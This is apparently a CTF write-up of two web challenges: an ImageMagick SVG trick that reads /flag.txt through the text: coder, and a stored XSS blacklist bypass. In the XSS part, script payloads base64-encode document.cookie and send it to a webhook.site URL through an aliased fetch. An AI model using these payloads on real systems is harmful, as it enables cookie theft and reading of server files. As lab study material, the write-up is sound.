# Web

## ImageMagick

<img width="977" height="696" alt="image" src="https://github.com/user-attachments/assets/3e431c21-390d-4c78-9cd2-5206663f769c" />

ImageMagick had multiple known CVE’s that were commonly used by CTF creators for challenges, this challenge is a really straight forward challenge. It required us to upload an image and convert to `.png`

And for this challenge we were also given source code. So here’s the vulnerable part:

```
    if file_size > 10 * 1024:
        flash("File too large! Max 10 KB.")
        return redirect(url_for('index'))

    # safe filename and saved path
    filename = secure_filename(f.filename) or f'upload-{uuid.uuid4().hex}'
    saved_path = os.path.join(UPLOAD_DIR, filename)
    f.save(saved_path)

    base, _ = os.path.splitext(filename)
    out_filename = base + '.png'
    out_path = os.path.join(UPLOAD_DIR, out_filename)

    try:
        subprocess.run(
            ['convert', saved_path, out_path],
            check=True,
            timeout=10
        )
```

The application only checks file size (10 KB) and sanitizes the filename, but it doesn't validate the actual file content. I tried to build the exploit by referring to google however I still can't seem to understand as I'm still not familiar with building the payload for imagemagick. Until i stumble into this, 
https://www.synacktiv.com/publications/playing-with-imagetragick-like-its-2016

<img width="950" height="376" alt="image" src="https://github.com/user-attachments/assets/19189df8-d48e-4d8c-b6bd-0ffa76c1dc96" />

We can use `.svg` and have the payload inside. But the payload still won't work, ChatGPT deepened my understanding. It’s because there’s no custom policy override from here: 

```
    try:
        subprocess.run(
            ['convert', saved_path, out_path],
            check=True,
            timeout=10
        )
```

That’s why its using ImageMagick default security policy that block MSL: 

<img width="894" height="406" alt="image" src="https://github.com/user-attachments/assets/fd1aa926-e77a-40ee-b17c-93408307b34c" />

 We can't use .msl is blocked. That’s why we altered the payload to use `.txt` instead: 

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 
<svg width="720px" height="1080px" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<image xlink:href="text:/flag.txt" />
</svg>
```

Save it as .svg and upload, and we will get flag as .png file format

<img width="409" height="305" alt="image" src="https://github.com/user-attachments/assets/99927d7c-2003-481c-8d9b-e83a808b3668" />

<img width="452" height="209" alt="image" src="https://github.com/user-attachments/assets/72a8bb1a-c2b6-409f-903e-f33b90cb334f" />

Flag: `igoh25{1a883d1f05f78b4c93286f17f1039a98}`

## top tier blacklist

<img width="399" height="296" alt="image" src="https://github.com/user-attachments/assets/cd054526-44e6-487f-aadd-34db10fd90f3" />

This should be a stored xss challenge that required us to steal cookies from the bot at **/flag?answer=<PAYLOAD>**. This question also does provide the source code:

Here's the filtered words:

```
blocked = ["alert(","'","replace(","[","]","javascript","@","!","%","location","href","fetch(","window","eval"] # good enough i guess
```

So here's our first payload for a check if the bot visit and all filter being bypassed:

```
<script>f=fetch;f`https://webhook.site/YOUR-ID/test123`</script>
```

- `fetch` works if we don't write `fetch(` directly (blacklist blocks `fetch(`)
- We can assign it to a variable first: `f=fetch`

Now let's try to get the cookies:

```
<script>fetch`https://webhook.site/id/`+document.cookie</script>
```

Tagged template literals with `+` don't concatenate properly in JavaScript. So, Instead of using `+`, JavaScript has template literals with `${}` for interpolation:

```
<script>c=btoa(document.cookie);u=`https://webhook.site/11b49e3d-4a7e-4a3b-80cd-436df6d3f76f/flag${c}`;f=fetch;f(u)</script>
```

So here's working encoded url:

```
http://3.0.177.234:13801/flag?answer=%3Cscript%3Ec%3Dbtoa(document.cookie)%3Bu%3D%60https%3A%2F%2Fwebhook.site%2F11b49e3d-4a7e-4a3b-80cd-436df6d3f76f%2Fflag%24%7Bc%7D%60%3Bf%3Dfetch%3Bf(u)%3C%2Fscript%3E
```

<img width="796" height="345" alt="image" src="https://github.com/user-attachments/assets/67bad9ef-82ae-422c-b80a-78917f806c6f" />

Breaking it down:
1. `c=btoa(document.cookie)` - Get cookie and base64 encode it
2. ``u=`url/flag${c}` `` - Build URL with cookie inside using `${}`
3. `f=fetch` - Store fetch in variable (bypasses `fetch(` blacklist)
4. `f(u)` - Make the request with our cookie.

<img width="742" height="711" alt="image" src="https://github.com/user-attachments/assets/5726fdae-059c-48dc-b02b-8a3b47b6d637" />



Flag: `igoh25{444d4ca034e4ea2a07aee37508a5df0e}`
